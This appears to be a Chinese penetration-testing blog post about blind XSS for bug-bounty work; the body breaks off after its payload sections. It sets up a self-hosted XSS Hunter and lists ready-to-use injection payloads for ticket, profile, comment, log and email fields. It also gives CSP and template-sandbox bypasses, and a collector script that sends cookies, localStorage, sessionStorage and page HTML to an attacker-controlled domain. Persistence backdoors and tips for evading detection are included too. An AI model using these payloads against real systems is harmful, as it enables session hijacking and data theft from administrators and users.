@@ -1,0 +1,500 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="盲XSS（Blind XSS）是一种在攻击者无法直接观察到弹窗的输入点注入Payload，等待后端系统触发后回调收集数据的持久型XSS攻击手法。本文分享从环境搭建到SRC实战的完整经验。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="盲XSS实战">
+<meta property="og:url" content="https://congliang.github.io/XSS-blind-xss/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="盲XSS（Blind XSS）是一种在攻击者无法直接观察到弹窗的输入点注入Payload，等待后端系统触发后回调收集数据的持久型XSS攻击手法。本文分享从环境搭建到SRC实战的完整经验。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-04-15T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T15:35:18.351Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/XSS-blind-xss/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/XSS-blind-xss/","path":"XSS-blind-xss/","title":"盲XSS实战"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>盲XSS实战 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AF%E7%9B%B2XSS"><span class="nav-number">1.</span> <span class="nav-text">一、什么是盲XSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E6%90%AD%E5%BB%BAXSS-Hunter"><span class="nav-number">2.</span> <span class="nav-text">二、搭建XSS Hunter</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E5%B8%B8%E8%A7%81%E7%9B%B2XSS%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="nav-number">3.</span> <span class="nav-text">三、常见盲XSS注入点</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-%E5%B7%A5%E5%8D%95-%E5%AE%A2%E6%9C%8D%E7%B3%BB%E7%BB%9F"><span class="nav-number">3.1.</span> <span class="nav-text">3.1 工单&#x2F;客服系统</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-%E7%94%A8%E6%88%B7%E6%B3%A8%E5%86%8C-%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF"><span class="nav-number">3.2.</span> <span class="nav-text">3.2 用户注册&#x2F;个人信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-%E8%AF%84%E8%AE%BA-%E7%95%99%E8%A8%80%E6%9D%BF%E5%AE%A1%E6%A0%B8%E5%90%8E%E5%8F%B0"><span class="nav-number">3.3.</span> <span class="nav-text">3.3 评论&#x2F;留言板审核后台</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-4-%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F"><span class="nav-number">3.4.</span> <span class="nav-text">3.4 日志系统</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-5-%E9%82%AE%E4%BB%B6%E5%AE%A2%E6%88%B7%E7%AB%AFXSS"><span class="nav-number">3.5.</span> <span class="nav-text">3.5 邮件客户端XSS</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E9%AB%98%E7%BA%A7Payload%E6%8A%80%E6%9C%AF"><span class="nav-number">4.</span> <span class="nav-text">四、高级Payload技术</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-%E7%BB%95%E8%BF%87CSP"><span class="nav-number">4.1.</span> <span class="nav-text">4.1 绕过CSP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-DOM%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">4.2.</span> <span class="nav-text">4.2 DOM信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-3-%E6%8C%81%E4%B9%85%E5%8C%96%E5%90%8E%E9%97%A8"><span class="nav-number">4.3.</span> <span class="nav-text">4.3 持久化后门</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81%E7%AD%89%E5%BE%85%E7%9A%84%E8%89%BA%E6%9C%AF%EF%BC%9A%E5%BB%B6%E8%BF%9F%E8%A7%A6%E5%8F%91%E4%B8%8E%E8%80%90%E5%BF%83%E8%BF%BD%E8%B8%AA"><span class="nav-number">5.</span> <span class="nav-text">五、等待的艺术：延迟触发与耐心追踪</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81SRC%E7%9B%B2XSS%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B"><span class="nav-number">6.</span> <span class="nav-text">六、SRC盲XSS实战案例</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B%E4%B8%80%EF%BC%9A%E7%A4%BE%E4%BA%A4%E5%B9%B3%E5%8F%B0%E7%A7%81%E4%BF%A1%E7%9B%B2XSS"><span class="nav-number">6.1.</span> <span class="nav-text">案例一：社交平台私信盲XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B%E4%BA%8C%EF%BC%9A%E7%94%B5%E5%95%86%E5%B9%B3%E5%8F%B0%E8%AE%A2%E5%8D%95%E5%A4%87%E6%B3%A8%E7%9B%B2XSS"><span class="nav-number">6.2.</span> <span class="nav-text">案例二：电商平台订单备注盲XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B%E4%B8%89%EF%BC%9A%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%95%86%E4%BC%81%E4%B8%9A%E8%AE%A4%E8%AF%81%E7%9B%B2XSS"><span class="nav-number">6.3.</span> <span class="nav-text">案例三：云服务商企业认证盲XSS</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83%E3%80%81%E7%9B%B2XSS%E6%B5%81%E7%A8%8B%E4%B8%8E%E5%B8%B8%E8%A7%81%E9%99%B7%E9%98%B1"><span class="nav-number">7.</span> <span class="nav-text">七、盲XSS流程与常见陷阱</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#7-1-%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="nav-number">7.1.</span> <span class="nav-text">7.1 工作流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-2-%E5%B8%B8%E8%A7%81%E9%99%B7%E9%98%B1"><span class="nav-number">7.2.</span> <span class="nav-text">7.2 常见陷阱</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AB%E3%80%81%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="nav-number">8.</span> <span class="nav-text">八、防御建议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B9%9D%E3%80%81%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E"><span class="nav-number">9.</span> <span class="nav-text">九、免责声明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-number">10.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/XSS-blind-xss/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="盲XSS实战 | 渗透测试实战记录">
+      <meta itemprop="description" content="盲XSS（Blind XSS）是一种在攻击者无法直接观察到弹窗的输入点注入Payload，等待后端系统触发后回调收集数据的持久型XSS攻击手法。本文分享从环境搭建到SRC实战的完整经验。">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          盲XSS实战
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-04-15 08:00:00" itemprop="dateCreated datePublished" datetime="2025-04-15T08:00:00+08:00">2025-04-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:35:18" itemprop="dateModified" datetime="2026-06-04T23:35:18+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">盲XSS（Blind XSS）是一种在攻击者无法直接观察到弹窗的输入点注入Payload，等待后端系统触发后回调收集数据的持久型XSS攻击手法。本文分享从环境搭建到SRC实战的完整经验。</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="一、什么是盲XSS"><a href="#一、什么是盲XSS" class="headerlink" title="一、什么是盲XSS"></a>一、什么是盲XSS</h2><p>盲XSS（Blind Cross-Site Scripting）与传统反射型&#x2F;DOM型XSS最大的区别在于：<strong>你永远不会在前端页面上看到弹窗</strong>。Payload被提交后存储在目标系统的数据库中，当管理员在后台审核、客服在工单系统查看、或者日志平台渲染用户输入时才会触发。攻击者依赖外带（out-of-band）回调来确认漏洞存在并收集数据。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[攻击者] --提交Payload--&gt; [留言板/工单/注册表单] --&gt; [数据库存储]</span><br><span class="line">                                |                          |</span><br><span class="line">                   [管理员后台] &lt;--+      [日志系统/客服面板] &lt;--+</span><br><span class="line">                        |                          |</span><br><span class="line">                        +--&gt; [XSS Hunter 回调] &lt;---+</span><br><span class="line">                                  |</span><br><span class="line">                          截图/Cookie/DOM/页面源码</span><br></pre></td></tr></table></figure>
+
+<p>盲XSS的典型生命周期：注入 → 静默等待 → 管理员触发 → 数据回传 → 编写报告。</p>
+<hr>
+<h2 id="二、搭建XSS-Hunter"><a href="#二、搭建XSS-Hunter" class="headerlink" title="二、搭建XSS Hunter"></a>二、搭建XSS Hunter</h2><p>公开的XSS Hunter服务（如 <code>xsshunter.com</code>）存在域名已被WAF标记、数据合规风险、可定制性差等问题，因此建议自建。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/mandatoryprogrammer/xsshunter.git</span><br><span class="line"><span class="built_in">cd</span> xsshunter</span><br><span class="line"><span class="comment"># 修改 api.yaml: 控制面板域名、回调域名（如 xss.yourdomain.com）、JS文件名随机化</span></span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>配置项</th>
+<th>说明</th>
+<th>建议</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>CALLBACK_DOMAIN</code></td>
+<td>Payload回调域名</td>
+<td>独立域名，不与主站关联</td>
+</tr>
+<tr>
+<td><code>JS_FILENAME</code></td>
+<td>注入用JS文件名</td>
+<td>随机化（如 <code>a8f3b2.js</code>），规避关键词检测</td>
+</tr>
+<tr>
+<td><code>COOKIE_SECRET</code></td>
+<td>会话加密密钥</td>
+<td>强随机字符串</td>
+</tr>
+<tr>
+<td><code>HTTPS</code></td>
+<td>是否启用TLS</td>
+<td>必须启用，否则HTTPS页面会拦截混合内容</td>
+</tr>
+</tbody></table>
+<p>基础Payload模板 <code>&lt;script src=&quot;//xss.yourdomain.com/a8f3b2.js&quot;&gt;&lt;/script&gt;</code>，自动收集 <code>document.cookie</code>、<code>document.domain</code>、<code>document.URL</code>、<code>body.innerHTML</code>（截取前5000字符）、浏览器指纹及页面截图。</p>
+<hr>
+<h2 id="三、常见盲XSS注入点"><a href="#三、常见盲XSS注入点" class="headerlink" title="三、常见盲XSS注入点"></a>三、常见盲XSS注入点</h2><h3 id="3-1-工单-客服系统"><a href="#3-1-工单-客服系统" class="headerlink" title="3.1 工单&#x2F;客服系统"></a>3.1 工单&#x2F;客服系统</h3><p>SRC中盲XSS最高发场景。用户提交工单的任意字段都可能进入后台。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 工单标题</span></span><br><span class="line"><span class="string">&quot;工单标题&quot;</span>&gt;&lt;img src=x onerror=&quot;$.getScript(&#x27;//xss.yourdomain.com/a8f3b2.js&#x27;)&quot;&gt;</span><br><span class="line"></span><br><span class="line">// 工单描述（富文本编辑器）</span><br><span class="line">&lt;a href=&quot;javascript:eval(atob(&#x27;...&#x27;))&quot;&gt;点击查看详情&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">// 附件文件名</span><br><span class="line">&lt;img src=x onerror=eval(atob(&#x27;...&#x27;))&gt;.pdf</span><br><span class="line"></span><br><span class="line">// 个人信息字段（姓名/电话/地址）</span><br><span class="line">&lt;script src=&quot;//xss.yourdomain.com/a8f3b2.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>某电商SRC：在退货工单”收货地址”字段注入Payload，三天后 <code>admin.internal.com</code> 触发回调，获取管理员Cookie，评级高危。</p>
+</blockquote>
+<h3 id="3-2-用户注册-个人信息"><a href="#3-2-用户注册-个人信息" class="headerlink" title="3.2 用户注册&#x2F;个人信息"></a>3.2 用户注册&#x2F;个人信息</h3><p>用户名字段常被忽略，但在管理员查看用户列表时触发。注意字段长度限制（通常20-30字符），需准备短Payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用户名: &lt;svg/onload=import(&#x27;//a.cc&#x27;)&gt;              // 25字符</span><br><span class="line">昵称:   &lt;img src=x onerror=import(&#x27;//a.cc&#x27;)&gt;        // 34字符</span><br><span class="line">签名档: &lt;body onload=import(&#x27;//xss.yourdomain.com/j.js&#x27;)&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-3-评论-留言板审核后台"><a href="#3-3-评论-留言板审核后台" class="headerlink" title="3.3 评论&#x2F;留言板审核后台"></a>3.3 评论&#x2F;留言板审核后台</h3><p>经典盲XSS场景，评论提交后需管理员在后台审核时触发。短Payload集合：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=<span class="keyword">import</span>(<span class="string">&#x27;//a.cc&#x27;</span>)&gt;          <span class="comment">// 25字符</span></span><br><span class="line">&lt;img src=x onerror=import(&#x27;//a.cc&#x27;)&gt;  // 34字符</span><br><span class="line">&lt;body onload=import(&#x27;//a.cc&#x27;)&gt;         // 29字符</span><br></pre></td></tr></table></figure>
+
+<p>建议购买短域名（如 <code>a.cc</code>）做CNAME跳转到XSS Hunter服务器，绕过长度限制。</p>
+<h3 id="3-4-日志系统"><a href="#3-4-日志系统" class="headerlink" title="3.4 日志系统"></a>3.4 日志系统</h3><p>ELK、Splunk等日志平台渲染用户输入时往往不做输出编码。</p>
+<table>
+<thead>
+<tr>
+<th>注入字段</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>User-Agent</td>
+<td><code>curl -H &#39;User-Agent: &lt;script src=&quot;//xss.yourdomain.com/j.js&quot;&gt;&lt;/script&gt;&#39; https://target.com</code></td>
+</tr>
+<tr>
+<td>搜索关键词</td>
+<td><code>https://target.com/search?q=&lt;img/src=x onerror=import(...)&gt;</code></td>
+</tr>
+<tr>
+<td>HTTP Referer</td>
+<td>从伪造页面跳转，Referer中携带Payload</td>
+</tr>
+<tr>
+<td>邮件主题</td>
+<td>发送邮件到客服，主题行嵌入XSS</td>
+</tr>
+</tbody></table>
+<h3 id="3-5-邮件客户端XSS"><a href="#3-5-邮件客户端XSS" class="headerlink" title="3.5 邮件客户端XSS"></a>3.5 邮件客户端XSS</h3><p>基于Web的邮件系统（尤其是自建邮件系统）在渲染HTML邮件时可能触发XSS：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">From: attacker@evil.com</span><br><span class="line">Subject: 关于您的订单 #<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;$.getScript(&#x27;//xss.yourdomain.com/j.js&#x27;)&quot;</span>&gt;</span></span><br><span class="line">Content-Type: text/html</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;display:none&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;import(&#x27;//xss.yourdomain.com/j.js&#x27;)&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>尊敬的客服人员，请查看附件中的订单详情。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Gmail和Outlook企业版对XSS有较强过滤，但自建邮件系统和部分国内企业邮箱保护较弱。</p>
+<hr>
+<h2 id="四、高级Payload技术"><a href="#四、高级Payload技术" class="headerlink" title="四、高级Payload技术"></a>四、高级Payload技术</h2><h3 id="4-1-绕过CSP"><a href="#4-1-绕过CSP" class="headerlink" title="4.1 绕过CSP"></a>4.1 绕过CSP</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 利用JSONP端点</span></span><br><span class="line">&lt;script src=<span class="string">&quot;https://target.com/api/jsonp?callback=eval(atob(&#x27;...&#x27;))&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Angular/Vue沙箱逃逸（针对特定版本）</span></span><br><span class="line">&#123;&#123;constructor.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;import(&quot;//xss.yourdomain.com/j.js&quot;)&#x27;</span></span>)(<span class="params"></span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-2-DOM信息收集"><a href="#4-2-DOM信息收集" class="headerlink" title="4.2 DOM信息收集"></a>4.2 DOM信息收集</h3><p>触发时应收集数据以最大化影响：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> c = &#123;</span><br><span class="line">    <span class="attr">cookie</span>: <span class="variable language_">document</span>.<span class="property">cookie</span>,</span><br><span class="line">    <span class="attr">url</span>: <span class="variable language_">document</span>.<span class="property">URL</span>,</span><br><span class="line">    <span class="attr">domain</span>: <span class="variable language_">document</span>.<span class="property">domain</span>,</span><br><span class="line">    <span class="attr">title</span>: <span class="variable language_">document</span>.<span class="property">title</span>,</span><br><span class="line">    <span class="attr">localStorage</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">localStorage</span>),</span><br><span class="line">    <span class="attr">sessionStorage</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">sessionStorage</span>),</span><br><span class="line">    <span class="attr">innerHTML</span>: <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">innerHTML</span>.<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">10000</span>),</span><br><span class="line">    <span class="attr">ua</span>: navigator.<span class="property">userAgent</span>,</span><br><span class="line">    <span class="attr">language</span>: navigator.<span class="property">language</span>,</span><br><span class="line">    <span class="attr">screen</span>: screen.<span class="property">width</span> + <span class="string">&#x27;x&#x27;</span> + screen.<span class="property">height</span>,</span><br><span class="line">    <span class="attr">timestamp</span>: <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">toISOString</span>()</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Image</span>().<span class="property">src</span> = <span class="string">&#x27;//xss.yourdomain.com/collect?d=&#x27;</span> + <span class="title function_">btoa</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(c));</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-3-持久化后门"><a href="#4-3-持久化后门" class="headerlink" title="4.3 持久化后门"></a>4.3 持久化后门</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// localStorage持久化</span></span><br><span class="line"><span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&#x27;__debug&#x27;</span>, <span class="string">&#x27;import(&quot;//xss.yourdomain.com/backdoor.js&quot;)&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Service Worker持久化（需同源）</span></span><br><span class="line">navigator.<span class="property">serviceWorker</span>.<span class="title function_">register</span>(<span class="string">&#x27;/sw.js&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<hr>
